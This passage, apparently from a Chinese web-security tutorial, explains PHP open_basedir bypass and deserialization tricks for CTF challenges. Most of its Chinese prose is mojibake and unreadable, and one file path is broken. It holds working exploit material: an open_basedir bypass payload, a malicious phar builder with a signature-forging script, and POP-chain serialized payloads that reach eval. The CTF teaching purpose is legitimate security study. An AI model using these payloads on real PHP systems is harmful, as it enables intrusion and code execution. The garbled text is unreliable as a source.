éƒ½ä¼šè¿›è¡Œä¸€æ¬¡open_basedirçš„æ¯”å¯¹ï¼Œå³php_check_open_basedir_exã€‚ç”±äºç›¸å¯¹è·¯å¾„çš„é—®é¢˜ï¼Œæ¯æ¬¡open_basedirçš„è¡¥å…¨éƒ½ä¼šä¸Šè·³ã€‚ æ¯”å¦‚åˆè¯•open_basedirä¸º/a/b/c/d ç¬¬ä¸€æ¬¡chdiråå˜ä¸º/a/b/cï¼Œ ç¬¬äºŒæ¬¡chdiråå˜ä¸º/a/bï¼Œ ç¬¬ä¸‰æ¬¡chdiråå˜ä¸º/aï¼Œ ç¬¬å››æ¬¡chdiråå˜ä¸º/ é‚£ä¹ˆè¿™æ—¶å€™å†è¿›è¡Œini_setï¼Œè°ƒæ•´open_basedirä¸º/å³å¯é€šè¿‡php_check_open_basedir_exçš„æ ¡éªŒï¼ŒæˆåŠŸè¦†ç›–ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥bypass open_basedirã€‚ æ‰€ä»¥é€šç”¨çš„payloadåŸºæœ¬å¦‚ä¸‹ï¼š &lt;?php mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));?&gt; 0x02 wake_upç»•è¿‡ PHP-GCåƒåœ¾å›æ”¶æœºåˆ¶ è¿™é‡Œçœ‹åˆ°ä¸‹é¢çš„ç»•è¿‡æ–¹æ³•åŸºæœ¬éƒ½æ˜¯è¯¥GCæœºåˆ¶å¼•èµ·çš„ï¼Œæ•…æ­¤å…ˆæ¥å­¦ä¹ ä¸€ä¸‹å‰ç½®çŸ¥è¯†ã€‚ ä½•ä¸ºGC Gcï¼Œå…¨ç§°Garbage collectionï¼Œå³åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œåœ¨PHPä¸­æœ‰è¿™ä¸ªGCæœºåˆ¶ PHPä¸­çš„GC åœ¨PHPä¸­ï¼Œä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸæ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡ï¼Œå½“ä¸€ä¸ªå˜é‡è¢«è®¾ç½®ä¸ºNULLï¼Œæˆ–è€…æ²¡æœ‰ä»»ä½•æŒ‡é’ˆæŒ‡å‘çš„æ—¶å€™ï¼Œä»–å°±ä¼šè¢«å˜æˆåƒåœ¾ï¼Œè¢«GCæœºåˆ¶è‡ªåŠ¨å›æ”¶ã€‚ å…¶å®è¯´ç™½äº†å°±æ˜¯å½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨æ—¶ï¼Œå°±ä¼šè¢«GCå›æ”¶ï¼Œåœ¨å›æ”¶çš„æ—¶å€™ä»–ä¼šè‡ªåŠ¨è°ƒç”¨destructææ„å‡½æ•°ï¼Œè€Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»•è¿‡æŠ›å‡ºå¼‚å¸¸çš„å…³é”®ç‚¹ï¼Œæ¥ä¸‹æ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯å¼•ç”¨è®¡æ•° å¼•ç”¨è®¡æ•° å½“æˆ‘ä»¬PHPåˆ›å»ºä¸€ä¸ªå˜é‡æ—¶ï¼Œè¿™ä¸ªå˜é‡ä¼šè¢«å­˜å‚¨åœ¨ä¸€ä¸ªåä¸ºzvalçš„å˜é‡å®¹å™¨ä¸­ã€‚åœ¨è¿™ä¸ªzvalå˜é‡å®¹å™¨ä¸­ï¼Œä¸ä»…åŒ…å«å˜é‡çš„ç±»å‹å’Œå€¼ï¼Œè¿˜åŒ…å«ä¸¤ä¸ªå­—èŠ‚çš„é¢å¤–ä¿¡æ¯ã€‚ ç¬¬ä¸€ä¸ªå­—èŠ‚åä¸ºis_refï¼Œæ˜¯boolå€¼ï¼Œå®ƒç”¨æ¥æ ‡è¯†è¿™ä¸ªå˜é‡æ˜¯å¦æ˜¯å±äºå¼•ç”¨é›†åˆã€‚PHPå¼•æ“é€šè¿‡è¿™ä¸ªå­—èŠ‚æ¥åŒºåˆ†æ™®é€šå˜é‡å’Œå¼•ç”¨å˜é‡ï¼Œç”±äºPHPå…è®¸ç”¨æˆ·ä½¿ç”¨&amp;æ¥ä½¿ç”¨è‡ªå®šä¹‰å¼•ç”¨ï¼Œzvalå˜é‡å®¹å™¨ä¸­è¿˜æœ‰ä¸€ä¸ªå†…éƒ¨å¼•ç”¨è®¡æ•°æœºåˆ¶ï¼Œæ¥ä¼˜åŒ–å†…å­˜ä½¿ç”¨ã€‚ ç¬¬äºŒä¸ªå­—èŠ‚æ˜¯refcountï¼Œå®ƒç”¨æ¥è¡¨ç¤ºæŒ‡å‘zvalå˜é‡å®¹å™¨çš„å˜é‡ä¸ªæ•°ã€‚æ‰€æœ‰çš„ç¬¦å·å­˜å‚¨åœ¨ä¸€ä¸ªç¬¦å·è¡¨ä¸­ï¼Œå…¶ä¸­æ¯ä¸ªç¬¦å·éƒ½æœ‰ä½œç”¨åŸŸã€‚ å±•ç¤ºå‡ ä¸ªä¾‹å­ï¼š &lt;?php $a = \"new string\"; xdebug_debug_zval('a'); //ç”¨äºæŸ¥çœ‹å˜é‡açš„zvalå˜é‡å®¹å™¨çš„å†…å®¹ ?&gt; è¾“å‡ºå¦‚ä¸Šï¼Œè¿™é‡Œçœ‹ç€å’Œæ–‡ç« ä¸ä¸€æ ·ï¼Œå› ä¸ºæˆ‘ä»¬å¾ˆæ˜æ˜¾åªå®šä¹‰äº†ä¸€ä¸ªå˜é‡ï¼Œä½†è¿™é‡Œçš„refcountçš„å€¼å´æ˜¯2ï¼Œéšåè¯¢é—®äº†GPTå‘ç°æ˜¯å‡½æ•°çš„é—®é¢˜ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨xdebug_debug_zvalæ¥æ£€æŸ¥å˜é‡æ—¶ï¼Œxdebugä¼šåˆ›å»ºè¿™ä¸ªå˜é‡çš„ä¸€ä¸ªå‰¯æœ¬ä»¥é˜²æ­¢ä¿®æ”¹åŸå§‹å˜é‡ï¼Œè¿™ä¸ªè¿‡ç¨‹å°†å¢åŠ zvalçš„å¼•ç”¨è®¡æ•°ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªå¼•ç”¨ &lt;?php $a = \"new string\"; $b = &amp;$a; xdebug_debug_zval('a'); //ç”¨äºæŸ¥çœ‹å˜é‡açš„zvalå˜é‡å®¹å™¨çš„å†…å®¹ ?&gt; å¦‚ä¸Šå›¾è¿™é‡Œrefcountï¼Œçœ‹åˆ°è¿™é‡Œä¾æ—§å‘ç°refcountæ˜¯2ï¼Œåœ¨è¿™æ˜¯å› ä¸ºæ­¤æ—¶aå’Œbå˜é‡å…±åŒä½¿ç”¨åŒä¸€ä¸ªåœ°å€ï¼Œé‚£ä»–ä»¬å®é™…ä¸Šä¼šå…±åŒæŒ‡å‘å˜é‡aæ‰€åœ¨zvalç»“æ„ï¼Œä¹Ÿå°±æ˜¯åŒä¸€ä¸ªzvalè¢«ä¸¤ä¸ªå˜é‡æ‰€å¼•ç”¨ï¼Œå› æ­¤refcount=2 æ¥ä¸‹æ¥è¯´ä¸€ä¸‹å®¹å™¨çš„é”€æ¯è¿™ä¸ªäº‹ï¼Œå˜é‡å®¹å™¨åœ¨refcountå˜æˆ0æ—¶å°±è¢«é”€æ¯ã€‚å®ƒè¿™ä¸ªå€¼æ˜¯å¦‚ä½•å‡å°‘çš„å‘¢ï¼Œå½“å‡½æ•°æ‰§è¡Œç»“æŸæˆ–è€…å¯¹å˜é‡è°ƒç”¨äº†unset()å‡½æ•°,refcountå°±ä¼šå‡1ã€‚çœ‹ä¸ªä¾‹å­ &lt;?php $a=\"new string\"; $b =&amp;$a; $c =&amp;$b; xdebug_debug_zval('a'); unset($b,$c);//é”€æ¯å˜é‡bå’Œc xdebug_debug_zval('a'); ?&gt; è¿™é‡Œçœ‹åˆ°åœ¨unsetäº†bå’Œcä¹‹årefcountæ¢å¤åˆ°äº†1ï¼Œä½†æ˜¯is_refçš„å€¼å´æˆä¸ºäº†1ï¼ŒæŒ‰å¸¸ç†æ¥è¯´ï¼Œè¿™é‡Œé”€æ¯äº†bå’Œcå˜é‡ï¼Œé‚£ä¹ˆaå˜é‡å°±æ²¡æœ‰è¢«å¼•ç”¨äº†ï¼Œis_refçš„å€¼åº”è¯¥ä¸º0ã€‚æˆ‘ä»¬çœ‹çœ‹GPTçš„å›ç­”ï¼š å½“ä½ é”€æ¯å…¶ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªå¼•ç”¨å˜é‡ï¼Œå³ä½¿ä½¿ç”¨äº†unsetï¼Œå‰©ä¸‹çš„å˜é‡ï¼ˆè¿™é‡Œæ˜¯$aï¼‰ä»ç„¶ä¿æŒåŸå§‹zvalçš„çŠ¶æ€ï¼Œå…¶ä¸­åŒ…æ‹¬å®ƒçš„is_refå’Œrefcountçš„å€¼ã€‚ unset($b, $c); // é”€æ¯å˜é‡$bå’Œ$c è¿™æ—¶å€™ï¼Œä½ é”€æ¯äº†å˜é‡$bå’Œ$cã€‚ç°åœ¨å¯¹åº”çš„zvalåªå‰©ä¸‹$aä¸€ä¸ªå¼•ç”¨ã€‚æ­¤æ—¶ï¼Œå¼•ç”¨è®¡æ•°ï¼ˆrefcountï¼‰å°†å‡å°‘ï¼Œä½†is_refä»ç„¶ä¿æŒåŸæ¥çš„å€¼ï¼Œå› ä¸ºè¿™ä¸ªæ ‡å¿—è¡¨ç¤ºzvalæ˜¯å¦å¯ä»¥è¢«ä½œä¸ºå¼•ç”¨ï¼Œå¹¶ä¸æ˜¯è¯´å®ƒæ˜¯å¦å½“å‰è¢«å¼•ç”¨ã€‚ xdebug_debug_zval('a'); åœ¨ç¬¬äºŒæ¬¡è°ƒç”¨xdebug_debug_zvalæ—¶ï¼Œä½ å¯ä»¥çœ‹åˆ°refcountåº”è¯¥å·²ç»å‡å°‘ï¼Œä½†is_refæ ‡å¿—ä»ç„¶ä¸º1ï¼Œå› ä¸ºå®ƒæ˜¯è¡¨ç¤ºå˜é‡$açš„zvalæ›¾ç»è¢«è®¾ç½®ä¸ºå¼•ç”¨ã€‚ç”±äºPHPçš„å†…éƒ¨ä¼˜åŒ–ï¼Œé™¤éå†æ¬¡å¯¹å˜é‡åšå‡ºä¿®æ”¹ï¼Œå¦åˆ™is_refæ ‡å¿—é€šå¸¸ä¸ä¼šå› unsetæ“ä½œè€Œè¢«æ”¹å˜ã€‚ ä¹Ÿå°±æ˜¯è¯´é™¤éæˆ‘ä»¬å°†å¯¹å˜é‡aå¼•ç”¨çš„ä»£ç å—åˆ é™¤ï¼Œæˆ–è€…é‡æ–°åˆ›å»ºä¸€ä¸ªå˜é‡aï¼Œè¿™æ—¶å€™ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„zvalç»“æ„ï¼Œè€Œè¯¥æ–°ç»“æ„å¹¶æœªè¢«å¼•ç”¨ï¼Œæ­¤æ—¶is_refä¸º0 GCåœ¨PHP ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨ GCå¦‚æœåœ¨PHPååºåˆ—åŒ–ä¸­ç”Ÿæ•ˆï¼Œé‚£å®ƒå°±ä¼šç›´æ¥è§¦å‘_destructæ–¹æ³•ï¼Œæ¥ä¸‹æ¥ä»¥ä¾‹å­æ¥æ¼”ç¤ºã€‚ demo1 é¦–å…ˆæ¥çœ‹å˜é‡è¢«unsetå‡½æ•°å¤„ç†çš„æƒ…å†µ &lt;?php highlight_file(__FILE__); error_reporting(0); class test{ public $num; public function __construct($num) { $this-&gt;num = $num; echo $this-&gt;num.\"__construct\".\"&lt;/br&gt;\"; } public function __destruct(){ echo $this-&gt;num.\"__destruct()\".\"&lt;/br&gt;\"; } } $a = new test(1); unset($a); $b = new test(2); $c = new test(3); ?&gt; //è¾“å‡ºå¦‚ä¸‹ï¼š //1__construct //1__destruct() //2__construct //3__construct //3__destruct() //2__destruct() å¯ä»¥çœ‹åˆ°å¯¹è±¡açš„ææ„å‡½æ•°åœ¨è°ƒç”¨unsetä¹‹åå°±è§¦å‘äº†ï¼Œä¸ä¸‹é¢ä¸¤ä¸ªç›¸æ¯”ï¼Œè¯¥ææ„å‡½æ•°çš„è°ƒç”¨æå‰äº† è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯å½“å¯¹è±¡ä¸ºNULLçš„æ—¶å€™ä¹Ÿå¯ä»¥ç›´æ¥è§¦å‘ææ„å‡½æ•°ï¼Œdemoå¦‚ä¸‹ &lt;?php show_source(__FILE__); $flag = \"flag\"; class B { function __destruct() { global $flag; echo $flag; } } $a = unserialize($_GET['1']); throw new Exception('ä½ æƒ³å¹²ä»€ä¹ˆ'); ?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœæ­£å¸¸ä¼ å…¥ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæ˜¯æ— æ³•è°ƒç”¨ææ„å‡½æ•°çš„ï¼Œç›´æ¥å°±è¢«æŠ›å‡ºé”™è¯¯ï¼Œè¿™ç¦»æˆ‘ä»¬éœ€è¦æ˜ç¡®çš„ä¸€ç‚¹æ˜¯ï¼š ååºåˆ—åŒ–æ“ä½œæœ¬èº«å¹¶ä¸ä¼šè‡ªåŠ¨è§¦å‘ææ„å‡½æ•°ï¼›ææ„å‡½æ•°çš„è°ƒç”¨è¦ä¹ˆæ˜¯å› ä¸ºå¯¹è±¡å°†ä¸å†è¢«å¼•ç”¨ï¼ˆå¯¹äºå±€éƒ¨å˜é‡ï¼Œä¼šåœ¨å…¶ä½œç”¨åŸŸç»“æŸæ—¶å‘ç”Ÿï¼‰ï¼Œè¦ä¹ˆæ˜¯å› ä¸ºæ•´ä¸ªè„šæœ¬çš„æ‰§è¡Œå·²ç»ç»“æŸï¼ˆå¯¹äºå…¨å±€å˜é‡ï¼‰ã€‚ å¯¹åº”åˆ°ä¸Šè¿°ä»£ç å°±æ˜¯æˆ‘ä»¬çš„unserialize($_GET['1']);è¢«èµ‹å€¼ç»™äº†å˜é‡aï¼Œä½†aæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œåªæœ‰å½“è„šæœ¬æ‰§è¡Œç»“æŸä¹‹åaçš„ç”Ÿå‘½å‘¨æœŸæ‰ä¼šç»“æŸï¼Œæ­¤æ—¶æ‰ä¼šè°ƒç”¨ææ„å‡½æ•°ï¼Œä½†æ˜¯åœ¨è„šæœ¬ç»“æŸå‰ï¼Œè¢«throw new Exception('ä½ æƒ³å¹²ä»€ä¹ˆ');æŠ›å‡ºäº†å¼‚å¸¸ï¼Œé‚£ä¹ˆPHPä¼šå› ä¸ºè¿™ä¸ªå¼‚å¸¸è€Œç›´æ¥ä¸­æ–­è„šæœ¬çš„æ‰§è¡Œï¼Œè¿™å¯¼è‡´äº†å˜é‡açš„ææ„å‡½æ•°æ²¡æœ‰æœºä¼šè¢«è°ƒç”¨ è„šæœ¬ç»ˆæ­¢åï¼Œæ‰€æœ‰å‰©ä½™çš„æ¸…ç†å·¥ä½œï¼ˆåŒ…æ‹¬ææ„å‡½æ•°è°ƒç”¨ï¼‰å°†åœ¨è„šæœ¬æ‰§è¡Œé€€å‡ºçš„æ¸…ç†è¿‡ç¨‹ä¸­å®Œæˆã€‚æˆ–è€…å¦‚æœè„šæœ¬ç”±äºå¼‚å¸¸è€Œç»ˆæ­¢ï¼Œææ„å‡½æ•°å¯èƒ½æ ¹æœ¬æ²¡æœ‰è¢«è°ƒç”¨ï¼Œå› ä¸ºPHPå°è¯•å…ˆå¤„ç†å¼‚å¸¸ã€‚ é‚£æ­¤æ—¶æˆ‘ä»¬å°†å˜é‡aåˆ é™¤çœ‹çœ‹ &lt;?php show_source(__FILE__); $flag = \"flag\"; class B { function __destruct() { global $flag; echo $flag; } } $poc = new B(); echo serialize($poc); unserialize($_GET['1']); throw new Exception('ä½ æƒ³å¹²ä»€ä¹ˆ'); ?&gt; å¯ä»¥çœ‹åˆ°è™½ç„¶ä¾æ—§è¢«æŠ›å‡ºäº†å¼‚å¸¸ï¼Œä½†æˆ‘ä»¬çš„ææ„å‡½æ•°ä¹Ÿè¢«æ­£å¸¸è°ƒç”¨äº†ã€‚è¿™æ˜¯ç”±äºunserialize($_GET['1']);æ²¡æœ‰èµ‹å€¼ç»™å…¶ä»–å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è°ƒç”¨å®Œunserializeä¹‹åï¼Œè¿™ä¸ªå¯¹è±¡å°±ç«‹å³æ²¡æœ‰äº†å¯¹å®ƒçš„å¼•ç”¨ï¼Œæ­¤æ—¶çš„PHP GCæœºåˆ¶åˆ¤æ–­å‡ºè¯¥å¯¹è±¡æ²¡æœ‰äº†å¼•ç”¨ï¼Œå°±æ˜¯è°ƒç”¨åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œå°†å…¶å›æ”¶ï¼Œè¿™æ—¶å€™å°±ä¼šè°ƒç”¨ææ„å‡½æ•°æ¥æ¸…ç†ã€‚ ä½†å¦‚æœçœŸå®ç¯å¢ƒä¸‹ï¼Œè¿™é‡Œå°±æ˜¯è¢«æŸä¸ªå˜é‡å¼•ç”¨äº†ï¼Œæˆ‘ä»¬å¦‚ä½•ç»•è¿‡å¼‚å¸¸æ¥è°ƒç”¨ææ„å‡½æ•°å‘¢ï¼Œå³å¦‚ä½•æå‰è§¦å‘GCåƒåœ¾å›æ”¶æœºåˆ¶ï¼Œè¿™é‡Œçœ‹çœ‹å¤§å¸ˆå‚…å¦‚ä½•ç»•è¿‡çš„ï¼Œå®ƒé‡‡ç”¨ååºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„æ¥å°è¯•ç»•è¿‡ &lt;?php show_source(__FILE__); class B { function __destruct() { global $flag; echo $flag; } } $a=array(new B,0); echo serialize($a); ?&gt; å¾—åˆ°åºåˆ—åŒ–æ–‡æœ¬å¦‚ä¸‹ a:2:{i:0;O:1:\"B\":0:{}i:1;i:0;} //å¯¹è±¡ç±»å‹:é•¿åº¦:{ç±»å‹:é•¿åº¦;ç±»å‹:é•¿åº¦:ç±»å:å€¼ç±»å‹:é•¿åº¦;ç±»å‹:é•¿åº¦;} //æ•°ç»„:é•¿åº¦ä¸º2:{intå‹:é•¿åº¦0;ç±»:é•¿åº¦ä¸º1:ç±»åä¸º\"B\":å€¼ä¸º0 intå‹:å€¼ä¸º1ï¼šintå‹;å€¼ä¸º0 æ¥ä¸‹æ¥è¿™ä½å¸ˆå‚…å°†ç¬¬äºŒä¸ªç´¢å¼•ç½®ç©ºï¼Œå°±å¯ä»¥è§¦å‘GCå›æ”¶æœºåˆ¶ï¼Œå› æ­¤ä¿®æ”¹åºåˆ—åŒ–æ–‡æœ¬ä¸º a:2:{i:0;O:1:\"B\":0:{}i:0;i:0;} å¯ä»¥çœ‹åˆ°æˆåŠŸç»•è¿‡ è¿™é‡Œæˆ‘è®¤ä¸ºæ˜¯å°†ä¸¤ä¸ªç´¢å¼•éƒ½æ”¹ä¸ºäº†åŒä¸€ä¸ªï¼Œè¿™å¯¼è‡´æŒ‡é’ˆå‡ºäº†é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯åœ¨å¼€å§‹çš„æ—¶å€™å¯¹è±¡Bçš„ç´¢å¼•ä¸º0ï¼Œä¹Ÿå°±æ˜¯a[0]=Bï¼Œä¹‹ååˆæ¥äº†ä¸€ä¸ªa[0]=0ï¼Œå› æ­¤å‰è€…çš„å¼•ç”¨æ¶ˆå¤±äº†ï¼Œä¹Ÿå°±æˆåŠŸè§¦å‘ææ„å‡½æ•°äº† Gcåœ¨Pharååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨ Gcåœ¨Pharååºåˆ—åŒ–ä¸­ç±»ä¼¼äºPHPååºåˆ—åŒ–ï¼Œä¹Ÿæ˜¯å½“é‡åˆ°æŠ›å‡ºå¼‚å¸¸æ—¶ï¼Œå¯ä»¥å€Ÿç”¨ä¸Šé¢çš„æ–¹æ³•æ¥å®ç°ç»•è¿‡ï¼Œä¸‹é¢ä»¥demoæ¥ç®€å•è®²è§£ä¸€ä¸‹ã€‚ demo2 &lt;?php highlight_file(__FILE__); class Test{ public $code; public function __destruct(){ eval($this -&gt; code); } } $filename = $_GET['filename']; echo file_get_contents($filename); throw new Error(\"Garbage collection\"); ?&gt; è¿™é‡Œçœ‹åˆ°file_get_contentså‡½æ•°å’Œevalï¼Œæ¯«æ— ç–‘é—®å°±æ˜¯pharååºåˆ—åŒ–äº†ã€‚payloadå¦‚ä¸‹ &lt;?php //ini_set(\"phar.readonly\", 0); class Test{ public $code; } //@unlink(\"phar.phar\"); $phar = new Phar(\"1.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //è®¾ç½®stub $a = new Test(); $a = 'phpinfo()'; $o = array($a, 0); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; ç”¨ç¼–è¾‘å™¨æ‰“å¼€åï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šè¿°æ€è·¯æ¥ä¿®æ”¹æ­¤å¤„çš„ç´¢å¼•ï¼Œä»¥æ­¤æ¥ç»•è¿‡å¼‚å¸¸ï¼Œä½†æ³¨æ„çš„æ˜¯pharæ–‡ä»¶ä¸­ä¸èƒ½éšæ„ä¿®æ”¹æ•°æ®ï¼Œå¦åˆ™å°±ä¼šå› ä¸ºç­¾åé”™è¯¯è€Œå¯¼è‡´æ–‡ä»¶å‡ºé”™ï¼Œä½†ç­¾åå¯ä»¥è¿›è¡Œä¼ªé€ ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾æ—§å¯ä»¥å…ˆç›´æ¥ä¿®æ”¹ï¼Œä¹‹åé‡æ–°è®¡ç®—æ–‡ä»¶ç­¾å import urllib.parse from hashlib import sha1 with open('D:\\\\PphProject\\\\Scripts\\\\1.phar', 'rb') as file: f = file.read() s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ® h = f[-8:] # è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯† newf = s + sha1(s).digest() + h # æ•°æ® + ç­¾å + (ç±»å‹ + GBMB) with open('newtest.phar', 'wb') as file: file.write(newf) # å†™å…¥æ–°æ–‡ä»¶ æ¥ä¸‹æ¥å°±åˆ©ç”¨pharä¼ªåè®®å³å¯ï¼šfilename=phar://D:\\PphProject\\Scripts ewtest.phar CTFä¾‹é¢˜ è¿™é“é¢˜æ˜¯H3018å¤§å¸ˆå‚…åœ¨çŸ¥è¯†åˆ†äº«æ—¶çš„ä¾‹é¢˜ï¼Œåœ¨è¿™é‡Œå¼•ç”¨ä¸€ä¸‹ï¼Œæºç å¦‚ä¸‹ &lt;?php highlight_file(__FILE__); error_reporting(0); class cg0{ public $num; public function __destruct(){ echo $this-&gt;num.\"hello __destruct\"; } } class cg1{ public $string; public function __toString() { echo \"hello __toString\"; $this-&gt;string-&gt;flag(); } } class cg2{ public $cmd; public function flag(){ echo \"hello __flag()\"; eval($this-&gt;cmd); } } $a=unserialize($_GET['code']); throw new Exception(\"Garbage collection\"); ?&gt; è¿™é“é¢˜çš„è¯æ€è·¯æ¯”è¾ƒç®€å•ï¼Œpocå¦‚ä¸‹ï¼š &lt;?php class cg0{ public $num; } class cg1{ public $string; } class cg2{ public $cmd; } $pop = new cg0(); $pop-&gt;num = new cg1(); $pop-&gt;num-&gt;string = new cg2(); $pop-&gt;num-&gt;string-&gt;cmd = 'phpinfo();'; $a = array($pop, 0); echo serialize($a); ?&gt; a:2:{i:0;O:3:\"cg0\":1:{s:3:\"num\";O:3:\"cg1\":1:{s:6:\"string\";O:3:\"cg2\":1:{s:3:\"cmd\";s:10:\"phpinfo();\";}}}i:1;i:0;}//æ­£å¸¸payload a:2:{i:0;O:3:\"cg0\":1:{s:3:\"num\";O:3:\"cg1\":1:{s:6:\"string\";O:3:\"cg2\":1:{s:3:\"cmd\";s:10:\"phpinfo();\";}}}i:0;i:0;}//ä¿®æ”¹åçš„payload å¦‚ä¸‹å›¾æˆåŠŸç»•è¿‡ CTFSHOWå·ç‹æ¯-easy unserialize &lt;?php include(\"./HappyYear.php\"); class one { public $object; public function MeMeMe() { array_walk($this, function($fn, $prev){ if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") { global $talk; echo \"$talk\".\"&lt;/br&gt;\"; global $flag; echo $flag; } }); } public function __destruct() { @$this-&gt;object-&gt;add(); } public function __toString() { return $this-&gt;object-&gt;string; } } class second { protected $filename; protected function addMe() { return \"Wow you have sovled\".$this-&gt;filename; } public function __call($func, $args) { call_user_func([$this, $func.\"Me\"], $args); } } class third { private $string; public function __construct($string) { $this-&gt;string = $string; } public function __get($name) { $var = $this-&gt;$name; $var[$name](); } } if (isset($_GET[\"ctfshow\"])) { $a=unserialize($_GET['ctfshow']); throw new Exception(\"é«˜ä¸€æ–°ç”ŸæŠ¥é“\"); } else { highlight_file(__FILE__); } è¿™ä¸ªååºåˆ—åŒ–ä¹Ÿè®©æˆ‘å­¦åˆ°äº†å¾ˆå¤šç‚¹ï¼Œå¯¹æˆ‘è¿™å½©ç¬”æ¥è¯´æœ‰ç‚¹éš¾ï¼Œè¿™é‡Œä¹Ÿæ˜¯å‚è€ƒäº†ä¸€ä¸‹wpæ‰æƒ³æ˜ç™½çš„æ€è·¯ï¼š é¦–å…ˆå®šä½åˆ°æ•æ„Ÿå­—æ®µecho $flag;é‚£æˆ‘ä»¬å°±è¦æƒ³å¦‚ä½•è°ƒç”¨mememeæ–¹æ³•äº†ï¼Œæœå¯»ä¸€ç•ªå¯èƒ½ä¼šæ‰¾ä¸åˆ°ï¼Œä½†ä»”ç»†åˆ†æä¼šå‘ç°call_user_func([$this, $func.\"Me\"], $args);å­˜åœ¨Meçš„å­—ç¬¦ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ call_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„[$this, $func.\"Me\"]å‚æ•°ä¼šè¢«å½“åšä¸€ä¸ªå‡½æ•°å»å¯¹å¾…ï¼Œåé¢çš„argsåˆ™æ˜¯è¯¥å‡½æ•°çš„å‚æ•°ï¼Œé‚£è¿™é‡Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºmememeæ–¹æ³•ã€‚ æ¥ä¸‹æ¥åœ¨æ€è€ƒå¦‚ä½•è°ƒç”¨å…¶æ‰€åœ¨çš„callæ–¹æ³•ï¼šéœ€è¦æ‰¾ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§çš„åœ°æ–¹ï¼Œé‚£å¾ˆæ˜æ˜¾å°±æ˜¯$this-&gt;object-&gt;add();æ­¤å¤„äº†ï¼Œè¿™ä¸¤ä¸ªåœ°æ–¹ç›¸äº’é…åˆåˆä¼šå»è°ƒç”¨addMeæ–¹æ³•ï¼Œæ¥ç€ä¼šè§¦å‘tostringã€‚ åœ¨è¯¥æ–¹æ³•ä¸‹æœ‰$this-&gt;object-&gt;string;è¿™é‡Œå¤§æ¦‚ç‡æ˜¯æƒ³è¦è°ƒç”¨thirdç±»çš„getæ–¹æ³•ï¼Œå› ä¸ºstringæ•°ä¸å¯è®¿é—®çš„å±æ€§ã€‚æœ€åå°±æ˜¯$var[$name]();è¿™ä¸€é‡è¦çš„ç‚¹äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨PHPæ–‡æ¡£ä¸­æ‰¾åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬æœ‰è¿™æ ·çš„ä»£ç ï¼š $var = [new one(), 'MeMeMe']; //åˆ™$var();å°±ä¼šå»è°ƒç”¨new oneå¯¹è±¡çš„mememeæ–¹æ³•äº† è‡³æ­¤é“¾å­æ‰“é€šäº†ï¼š ååºåˆ—åŒ–å…¥å£-&gt;one.destruct-&gt;second.call-&gt;second.addMe-&gt;one.tostring-&gt;third.get-&gt;one.MeMeMe è¿˜æœ‰æœ€åä¸€ä¸ªç‚¹ public function MeMeMe() { array_walk($this, function($fn, $prev){ if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") { global $talk; echo \"$talk\".\"&lt;/br&gt;\"; global $flag; echo $flag; } }); } è¿™é‡Œçš„ifè¯­å¥å¦‚ä½•ç»•è¿‡ï¼Œæˆ‘ä»¬å…ˆäº†è§£array_walkå‡½æ•°çš„ç”¨æ³• ç®€å•ä¾‹å­å¦‚ä¸‹ï¼š &lt;?php $fruits = array(\"d\" =&gt; \"lemon\", \"a\" =&gt; \"orange\", \"b\" =&gt; \"banana\", \"c\" =&gt; \"apple\"); function test_alter(&amp;$item1, $key, $prefix) { $item1 = \"$prefix: $item1\"; } function test_print($item2, $key) { echo \"$key. $item2&lt;br /&gt; \"; } echo \"Before ...: \"; array_walk($fruits, 'test_print'); array_walk($fruits, 'test_alter', 'fruit'); echo \"... and after: \"; array_walk($fruits, 'test_print'); ?&gt; 